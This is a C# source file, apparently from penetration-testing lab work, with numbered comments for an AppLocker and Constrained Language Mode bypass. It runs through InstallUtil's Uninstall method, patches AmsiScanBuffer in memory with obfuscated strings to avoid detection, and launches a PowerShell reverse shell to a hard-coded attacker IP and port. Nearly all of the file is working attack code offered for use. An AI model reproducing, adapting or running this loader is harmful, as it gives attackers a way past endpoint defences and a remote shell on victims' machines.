// 1. Write AppLocker-compliant loader (Uninstall() method, [RunInstaller(true)], public class)
//    - References needed:
//        System.Management.Automation
//        System.Configuration.Install

// 2. Patch AmsiScanBuffer in-process (prevents AMSI scanning the script that follows)
//    - LoadLibrary("amsi.dll") + GetProcAddress("AmsiScanBuffer")
//    - VirtualProtect to PAGE_EXECUTE_READWRITE
//    - Marshal.Copy patch bytes (mov eax,0x80070057; ret) over the function
//    - Build "amsi.dll"/"AmsiScanBuffer" strings at runtime (char-code build), not as literals
//      — avoids static signature on the compiled exe

// 3. Create a custom runspace inside Uninstall()
//    - RunspaceFactory.CreateRunspace() -> rs.Open()
//    - PowerShell.Create() -> ps.Runspace = rs
//    - ps.AddScript(cmd) with your actual payload -> ps.Invoke()
//    - This runspace runs in FullLanguage regardless of the host process's CLM

// 4. Make cmd a persistent command, not a one-shot
//    - A single command (e.g. Out-File) executes once and exits
//    - An interactive TCP socket loop (Read/IEX/Write in a while loop) keeps the runspace alive as a shell

// 5. Compile (x64, Release), copy exe to target
//    (path irrelevant — trust comes from InstallUtil's signed-publisher rule, not folder)

// 6. Trigger via InstallUtil (Microsoft-signed, passes AppLocker Exe rules)
//    installutil.exe /logfile= /LogToConsole=false /U C:\path\to\Bypass.exe

// 7. Catch the socket, confirm:
//    $ExecutionContext.SessionState.LanguageMode
//    -> FullLanguage

// 8. Dont forget to update attackers IP/PORT in PS revshell

using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Text;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static string Build(int[] codes)
        {
            StringBuilder sb = new StringBuilder();
            foreach (int c in codes) sb.Append((char)c);
            return sb.ToString();
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            try
            {
                // "amsi.dll"
                string dllName = Build(new int[] { 97, 109, 115, 105, 46, 100, 108, 108 });
                // "AmsiScanBuffer"
                string funcName = Build(new int[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });

                IntPtr amsiDll = LoadLibrary(dllName);
                IntPtr asb = GetProcAddress(amsiDll, funcName);
                uint oldProtect;
                VirtualProtect(asb, (UIntPtr)6, 0x40, out oldProtect);
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                Marshal.Copy(patch, 0, asb, patch.Length);

                String cmd = "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.182',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
            catch (Exception ex)
            {
                System.IO.File.WriteAllText("C:\\tmp\\err.txt", ex.ToString());
            }
        }
    }
}
